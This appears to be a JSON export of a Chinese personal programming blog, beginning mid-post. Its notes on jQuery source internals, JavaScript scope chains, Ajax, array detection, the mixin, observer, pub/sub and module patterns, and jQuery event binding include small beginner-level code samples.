设想一下，如果按照我们的常理思维返回Jquery构造函数的实例肯定是这样写这个构造函数123456jQuery = function( selector, context ) &#123; // The jQuery object is actually just the init constructor 'enhanced' // Need init if jQuery is called (just allow error to be thrown if not included) return new jQuery( selector, context ); &#125; 但是这样就出问题了， 出现一个不停的循环调用的状况，怎么办呢？ 作者于是就将返回的Jquery对象用另一个名字来代替，也就是Jquery.fn.init().Jquery.fn.init方法定义如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106init = jQuery.fn.init = function( selector, context, root ) &#123; var match, elem; // HANDLE: $(\"\"), $(null), $(undefined), $(false) if ( !selector ) &#123; return this; &#125; // Method init() accepts an alternate rootjQuery // so migrate can support jQuery.sub (gh-2101) root = root || rootjQuery; // Handle HTML strings if ( typeof selector === \"string\" ) &#123; if ( selector[ 0 ] === \"&lt;\" &amp;&amp; selector[ selector.length - 1 ] === \"&gt;\" &amp;&amp; selector.length &gt;= 3 ) &#123; // Assume that strings that start and end with &lt;&gt; are HTML and skip the regex check match = [ null, selector, null ]; &#125; else &#123; match = rquickExpr.exec( selector ); &#125; // Match html or make sure no context is specified for #id if ( match &amp;&amp; ( match[ 1 ] || !context ) ) &#123; // HANDLE: $(html) -&gt; $(array) if ( match[ 1 ] ) &#123; context = context instanceof jQuery ? context[ 0 ] : context; // Option to run scripts is true for back-compat // Intentionally let the error be thrown if parseHTML is not present jQuery.merge( this, jQuery.parseHTML( match[ 1 ], context &amp;&amp; context.nodeType ? context.ownerDocument || context : document, true ) ); // HANDLE: $(html, props) if ( rsingleTag.test( match[ 1 ] ) &amp;&amp; jQuery.isPlainObject( context ) ) &#123; for ( match in context ) &#123; // Properties of context are called as methods if possible if ( jQuery.isFunction( this[ match ] ) ) &#123; this[ match ]( context[ match ] ); // ...and otherwise set as attributes &#125; else &#123; this.attr( match, context[ match ] ); &#125; &#125; &#125; return this; // HANDLE: $(#id) &#125; else &#123; elem = document.getElementById( match[ 2 ] ); if ( elem ) &#123; // Inject the element directly into the jQuery object this[ 0 ] = elem; this.length = 1; &#125; return this; &#125; // HANDLE: $(expr, $(...)) &#125; else if ( !context || context.jquery ) &#123; return ( context || root ).find( selector ); // HANDLE: $(expr, context) // (which is just equivalent to: $(context).find(expr) &#125; else &#123; return this.constructor( context ).find( selector ); &#125; // HANDLE: $(DOMElement) &#125; else if ( selector.nodeType ) &#123; this[ 0 ] = selector; this.length = 1; return this; // HANDLE: $(function) // Shortcut for document ready &#125; else if ( jQuery.isFunction( selector ) ) &#123; return root.ready !== undefined ? root.ready( selector ) : // Execute immediately if ready is not present selector( jQuery ); &#125; return jQuery.makeArray( selector, this ); &#125;;// Give the init function the jQuery prototype for later instantiationinit.prototype = jQuery.fn;//相当于是jQuery.fn.init.prototype = JQuery.fn = JQuery.prototype//这样JQuery.fn.init的实例也就继承了JQuery原型对象中的方法，这一步进一步说明了在JQuery原型对象中添加的方法会被jQuery.fn.init的实例和JQuery.fn对象所共享 Jquery.fn是用对象字面量函数定义的一个对象, Jquery.fn = jQuery.prototype，在这个对象里面的方法和属性都是被Jquery类的实例所共享的，因此我们可以调用代码如下:将Jquery.fn对象指向Jquery的原型对象，那么JQuery.fn对象共享Jquery对象上的方法，从这段代码可看出 $.fn.method == $(‘selelctor’).method,这也就是为啥 $.fn.extend == $(selector).fn.extend的原因吧1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980jQuery.fn = jQuery.prototype = &#123; // The current version of jQuery being used jquery: version, constructor: jQuery, // The default length of a jQuery object is 0 length: 0, toArray: function() &#123; return slice.call( this ); &#125;, // Get the Nth element in the matched element set OR // Get the whole matched element set as a clean array get: function( num ) &#123; // Return all the elements in a clean array if ( num == null ) &#123; return slice.call( this ); &#125; // Return just the one element from the set return num &lt; 0 ? this[ num + this.length ] : this[ num ]; &#125;, // Take an array of elements and push it onto the stack // (returning the new matched element set) pushStack: function( elems ) &#123; // Build a new jQuery matched element set var ret = jQuery.merge( this.constructor(), elems ); // Add the old object onto the stack (as a reference) ret.prevObject = this; // Return the newly-formed element set return ret; &#125;, // Execute a callback for every element in the matched set. each: function( callback ) &#123; return jQuery.each( this, callback ); &#125;, map: function( callback ) &#123; return this.pushStack( jQuery.map( this, function( elem, i ) &#123; return callback.call( elem, i, elem ); &#125; ) ); &#125;, slice: function() &#123; return this.pushStack( slice.apply( this, arguments ) ); &#125;, first: function() &#123; return this.eq( 0 ); &#125;, last: function() &#123; return this.eq( -1 ); &#125;, eq: function( i ) &#123; var len = this.length, j = +i + ( i &lt; 0 ? len : 0 ); return this.pushStack( j &gt;= 0 &amp;&amp; j &lt; len ? [ this[ j ] ] : [] ); &#125;, end: function() &#123; return this.prevObject || this.constructor(); &#125;, // For internal use only. // Behaves like an Array's method, not like a jQuery method. push: push, sort: arr.sort, splice: arr.splice&#125;;","tags":[{"name":"jquery","slug":"jquery","permalink":"https://muzicy.github.io/tags/jquery/"}]},{"title":"理解作用域链","date":"2017-03-15T08:05:33.000Z","path":"2017/03/15/理解作用域链/","text":"有些东西很奇怪，明明看的时候很理解了， 等到过两天在去想是什么意思的时候， 就又开始说不清楚了， js中的作用域与作用域链大概就是这种感觉，大概这就是为什么我觉得它不好理解的原因吧，所以提笔记下来看看会不会清楚些， 通过高性能js理解。 作用域作用域在js中分为全局作用域和函数作用域。 在最外层函数和最外层函数外面定义的函数和变量拥有全局作用域， 所有未定义直接赋值的变量自动声明为拥有全局作用域， 所有window对象的属性也拥有全局作用域。 在函数内通过var 和非闭包形式定义的函数拥有函数作用域也就是局部作用域。 作用域链每一个js函数都是Function的一个实例， 是一个对象，在内部拥有一个[[Scope]]的属性，该属性包含了函数被创建的作用域中对象的集合，这个集合也就是称为函数的作用域链，它决定哪些数据能被函数访问， 函数作用域中的每一个对象被称为一个可变对象， 当一个函数被创建后，它的作用域链包含了可访问的数据对象。 1234function sum(num1, num2) &#123; var sum = num1 + num2; return sum;&#125; 该函数在全局作用域中被创建， 它的作用域链中填入了一个氮素的可变对象， 这个全局对象包含了所有全局范围的定义的变量，如window,navigator, document等。 add的作用域链将会在执行时用到1var total = sum(5, 10); 函数在执行时会有一个执行环境，这一执行环境是独一无二的。每个运行期上下文都有自己的作用域链， 它的作用域链初始化为当前运行函数的[[Scope]], 这个值按照他们出现在函数中的顺序被复制到执行器上下文的作用域链中， 一但复制完， 一个呗称为活动对象的新对象就为执行期上下文创建好了， 活动对象时指函数运行期的可变对象， 包含了所有局部变量， 命名参数， 集合参数和this, 然后此对象被推入作用域链的前端， 当运行期上下文被销毁， 活动对象也随之销毁。 总结：也就是说函数在创建的时候会有一个作用域链， 在函数调用时也会有一个作用域链， 这两个作用域链不一样， 在创建时对应的有一个变量对象，在调用时，作用域链中除了包含这个变量对象，也会创建一个变量对象， 在函数的执行过程中，每遇到一个变量，都会经历一次变量在作用域中查找的过程。 ps:码字的时候挺清晰的，可以让我去回答面试官这个问题估计又会说不清楚了。。。。","tags":[{"name":"js","slug":"js","permalink":"https://muzicy.github.io/tags/js/"}]},{"title":"ajax知识点","date":"2017-03-15T01:59:08.000Z","path":"2017/03/15/ajax知识点/","text":"Ajax的具体详解见文章Ajax知识体系大梳理,感谢作者如此细心的整理，将此文章转载过来以便自己不时的复习。 ajax的同步异步代码实现（见js高程设计书）:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;ajax的同步异步&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=\"text/javascript\"&gt; function getXHR() &#123; var xhr = null; if(window.XMLHttpRequest) &#123; xhr = new XMLHttpRequest(); &#125; else if(window.ActiveXObject) &#123; try &#123; xhr = new ActiveXObject('Msxml2.XMLHTTP'); &#125; catch(e) &#123; try &#123; xhr = new ActiveXObject('Microsoft.XMLHTTP'); &#125; catch(e) &#123; alert('您的浏览器不支持Ajax'); &#125; &#125; &#125; return xhr; &#125; var xhr= getXHR() //xhr的同步调用 xhr.open('get', RUL, false); xhr.send(null); if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status == 304) &#123; console.log(xhr.responseXML); &#125; else &#123; alert('request was unsuccessful'); &#125; //xhr的异步调用，通过onreadystateschange的状态来判断 xhr.onreadystatechange = function() &#123; if(xhr.readyState == 4) &#123; if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status == 304) &#123; console.log(xhr.responseText); &#125; else &#123; alert('request failed '+ xhr.status); &#125; &#125; &#125; xhr.open('get', URL, true); xhr.send(null); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","tags":[{"name":"ajax","slug":"ajax","permalink":"https://muzicy.github.io/tags/ajax/"}]},{"title":"检测数组的方法","date":"2017-03-14T08:45:38.000Z","path":"2017/03/14/检测数组的方法/","text":"如何通过js判断一个数组 arr instanceof Array constructor 的方法 arr.constructor == Array 利用数组也有的特性判断，比如splice Object.splice == ‘function’ 但是该方法有时候会失效。 123Object.prototype.toString.call(arr) //[Object Array] var isArr = Object.prototype.toString.call(arr).slice(8,-1) === 'Array' ES5新增加的isArray()方法","tags":[{"name":"js","slug":"js","permalink":"https://muzicy.github.io/tags/js/"}]},{"title":"'mixin模式'","date":"2017-03-13T11:56:44.000Z","path":"2017/03/13/mixin模式/","text":"mixin模式 –感觉类似于cpp里面的抽象出来的超类， 子类对象可以很轻松的集成超类中的属性和方法，优点:增加了函数复用，减少代码量。 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Mixin模式&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var Car = function(settings) &#123; this.model = settings.model || 'no model provided', this.color = settings.color || 'no color provided' &#125; var Mixin = function() &#123;&#125; Mixin.prototype = &#123; driveForward: function() &#123; console.log('drive forword'); &#125;, driveBackward: function() &#123; console.log('drive backwords') &#125; &#125;; function argument(receivingClass, givingClass) &#123; if(arguments[2]) &#123; for(var i = 2, len = arguments.length; i &lt; len; i++) &#123; receivingClass.prototype[arguments[i]] = givingClass.prototype[arguments[i]]; &#125; &#125; else &#123; for(var key in givingClass) &#123; if(!Object.hasOwnProperty(receivingClass.prototype, key)) &#123; receivingClass.prototype[key] = givingClass.prototype[key]; &#125; &#125; &#125; &#125; //只添加特定的方法到Car里面 argument(Car, Mixin, 'driveForward', 'driveBackward'); var myCar = new Car(&#123; model:'BWM', color:'red' &#125;); myCar.driveForward(); myCar.driveBackward(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;","tags":[]},{"title":"'pub/sub模式的实现'","date":"2017-03-13T07:40:44.000Z","path":"2017/03/13/pub-sub模式的实现/","text":"我也还不太清楚Observer模式和pub/sub模式的具体差别，observer模式一般是用pub/sub模式的变量来实现， Observer要求希望接收到主题通知的贯彻着必须订阅内容改变的事件。Pub/Sub模式使用一个事件通道， 通道介于发布者与订阅着之间 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;pub/sub模式实现&lt;/title&gt; &lt;style type=\"text/css\"&gt; .observersContainer &#123; width: 400px; height: 400px; background-color: #F5BBBB; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;input id='add' type='button' value='add Observer' /&gt;&lt;input id='notify' type=\"checkbox\" value='mainCheckbox' /&gt;&lt;div class='observersContainer'&gt;&lt;/div&gt;&lt;/body&gt;&lt;script type=\"text/javascript\"&gt; var Observers = &#123; observers: [], addObserver: function addObserver(newObserver) &#123; this.observers.push(newObserver); &#125;, removeObserver: function removeObserver(observer) &#123; for(var i = 0, len = observers.length; i &lt; len; i++) &#123; if(this.observers[i] == observer) &#123; this.observers.splice(i,1); &#125; &#125; &#125;, notifyObserver: function notifyObserver(value) &#123; var len = this.observers.length; while(len--) &#123; this.observers[len].update(value); &#125; &#125; &#125; var addBtn = document.getElementById('add'); var notifyBtn = document.getElementById('notify'); var showContents = document.getElementsByClassName('observersContainer')[0]; addBtn.onclick = function() &#123; var check = document.createElement('input'); check.type = 'checkbox'; check.update = function(value) &#123; this.checked = value; &#125; Observers.addObserver(check); showContents.appendChild(check); &#125; notifyBtn.onclick = function() &#123; var value = notifyBtn.checked; Observers.notifyObserver(value); &#125;&lt;/script&gt;&lt;/html&gt;","tags":[]},{"title":"'Observer模式的实现'","date":"2017-03-13T07:32:17.000Z","path":"2017/03/13/Observer模式的实现/","text":"简单的实现一个观察者模式,与发布订阅者模式的区别在于发布对象的变化是直接通知观察着对象，pub/sub模式中间多一个list，fire的时候会通知到订阅者123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;观察者模式实现&lt;/title&gt; &lt;style type=\"text/css\"&gt; .observersContainer &#123; width: 400px; height: 400px; background-color: #F5BBBB; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;input id='add' type='button' value='add Observer' /&gt;&lt;input id='notify' type=\"checkbox\" value='mainCheckbox' /&gt;&lt;div class='observersContainer'&gt;&lt;/div&gt;&lt;/body&gt;&lt;script type=\"text/javascript\"&gt; function ObserverList() &#123; this.observersList = []; &#125; ObserverList.prototype.addObserver = function(newObserver) &#123; this.observersList .push(newObserver); &#125; ObserverList.removeObserver = function(observer) &#123; for(var i = 0, len = this.observersList .length; i &lt; len; i++) &#123; if(this.observersList [i] == observer) &#123; this.observersList .splice(i,1); &#125; &#125; &#125; //subject function Subject() &#123; this.observers = new ObserverList(); &#125; Subject.prototype.AddObserver = function(observer) &#123; this.observers.addObserver(observer); &#125; Subject.prototype.Notify = function(context) &#123; for(var i = 0, len = this.observers.length; i &lt; len; i++) &#123; this.observers[i].update(context); console.log('notify') &#125; &#125; function extend(obj, extension) &#123; for (var key in obj) &#123; extension[key] = obj[key]; &#125; &#125; function Observer() &#123; this.update = function() &#123; &#125; &#125; var addBtn = document.getElementById('add'); var notifyBtn = document.getElementById('notify'); var showContents = document.getElementsByClassName('observersContainer')[0]; extend(new Subject(), notifyBtn); addBtn.onclick = function() &#123; var check = document.createElement('input'); check.type = 'checkbox'; extend(new Observer(), check) check.update = function(value) &#123; this.checked = value; &#125; notifyBtn.AddObserver(check); showContents.appendChild(check); &#125; notifyBtn['onclick'] = new Function(\"notifyBtn.Notify(notifyBtn.checked)\"); &lt;/script&gt;&lt;/html&gt;","tags":[]},{"title":"'Module（模块模式）'","date":"2017-03-13T03:50:37.000Z","path":"2017/03/13/Module（模块模式）/","text":"在js中，实现模块的方法有: 对象字面量表示法 Module模式 AMD模式 CommonJS模式 ECMAScript Hanmony 模式。 1.对象字面量模式 该模式比较简单， 就是我们最常用的构造对象的方式。 12345678var person = &#123; name:'muzi', age:'**', sex:'f'， likeMethods: function() &#123; return 'thinking' &#125;&#125; 对象字面有助于封装和组代码。 Module(模块)模式为类提供私有和公有的封装方法，在js中进一步模拟类 的实现。 Module模式使用闭包包装私有状态和组织，在该模式中，返回一个共有的API，其他的一切则维持在私有闭包里，该模式返回的是一个对象，如果返回的是一个函数的话，就和立即调用的表达式比较类似了。 代码实现123456789101112131415161718var testModule = (function() &#123; var count = 0; return &#123; incrementCounter: function() &#123; count++; &#125;, resetConunter: function() &#123; console.log('count value prior to reset:' + count); count = 0; &#125; &#125;&#125;)//调用:testModule.incementCounter();testModule.resetCounter(); 可以看到，唯一能访问count这一私有变量的只有testModule返回的对象的这两个方法。当然，也可以在该模式下添加共有变量和私有方法。 用这种模式实现一个购物车的实例 12345678910111213141516171819202122232425262728293031var basketModule = (function() &#123; var baskt = []; function dosomethingPrivate() &#123; &#125; function dosomethingElsePrivate() &#123;&#125; return &#123; addItem: function(values) &#123; basket.push(values); &#125;, getItemCount: function() &#123; return basket.length; &#125;, dosomething: dosomethingPrivate, getTotal； function() &#123; var itemCount = this.getItemCount(), total = 0; while(itemCount--) &#123; total += basket[itemCount].price; &#125; return total; &#125; &#125;&#125;) 模块模式的优点：1 使得代码更加整洁。 2. 支持数据的私有性，只有模块中的方法可以访问私有数据。 Revealing Module(揭示模块)模式这一模式能够在私有范围内简单的定义所有函数和变量，并且返回一个匿名对象，它拥有指向私有函数的指针。 代码实现12345678910111213141516171819202122var myRevalingModule = &#123; var privatename = 'zhangsan', publicVal = 'Hello ,welcome'; function privateFunction() &#123; console.log('name: ' + privateName); &#125; function publicGetName() &#123; privateFunction(); &#125; function publicSetName(value) &#123; privateName = value; &#125; return &#123; setName: publicSetName, getName: publicGetName, greetings: publicVal &#125;&#125; 相比与上一模块模式而言，很显然揭示模块模式返回对象简单，代码更加清晰，改善可读性。","tags":[]},{"title":"jq源码-事件机制1","date":"2017-03-12T13:45:48.000Z","path":"2017/03/12/jq源码-事件机制1/","text":"事件绑定接口有: bind, unbind, delegate,undelegate, on, one, off, trigger, triggerHandler. 以click例 :12345jQuery.fn[ 'click' ] = function( data, fn ) &#123; return arguments.length &gt; 0 ? this.on( name, null, data, fn ) : this.trigger( name );&#125;; bind方式123bind: function( types, data, fn ) &#123; return this.on( types, null, data, fn )&#125; 同样调用的this.on/this.off。delegate方式123delegate: function( selector, types, data, fn ) &#123; return this.on( types, selector, data, fn )&#125; one方式123one: function( types, selector, data, fn ) &#123; return this.on( types, selector, data, fn, 1 )&#125;","tags":[{"name":"jquery","slug":"jquery","permalink":"https://muzicy.github.io/tags/jquery/"}]},{"title":"js深度遍历对象的属性","date":"2017-03-12T12:34:21.000Z","path":"2017/03/12/js深度遍历对象的属性/","text":"前端考试题(3.11)如何深度遍历一个对象的属性代码实现: 1234567891011121314151617181920212223242526function optionalChaining(obj, chain) &#123; if (obj === null || obj == undefined) &#123; return 'undefined'; &#125; if(!(/\\./g).test(chain) &amp;&amp; obj[chain]) &#123; return obj[chain]; &#125; var arr = chain.split('.'); var len = arr.length, i=0; var local = ''; var local = arr.shift(); for (key in obj) &#123; // console.log(key === local &amp;&amp; obj[key] instanceof Object ) if (key === local &amp;&amp; obj[key] instanceof Object ) &#123; return optionalChaining(obj[key], arr.join('.')); &#125; &#125; return 'undefined' ; &#125;","tags":[{"name":"js","slug":"js","permalink":"https://muzicy.github.io/tags/js/"}]},{"title":"Hello World","date":"2017-03-12T12:29:54.614Z","path":"2017/03/12/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]